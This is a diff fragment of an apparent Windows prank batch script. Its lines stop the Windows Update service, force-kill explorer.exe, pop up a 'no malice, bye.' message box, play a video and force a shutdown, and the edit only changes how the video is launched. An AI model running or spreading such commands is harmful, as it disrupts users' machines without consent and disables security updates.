@@ -49,7 +49,7 @@ net stop "wuauserv"
 taskkill /f /im explorer.exe
 echo Msgbox"no malice, bye.",0+0,"LKR">>msg.vbs
 start msg.vbs
-start going.mp4
+start max going.mp4
 timeout /t 30
 shutdown -s -t 30
 exit
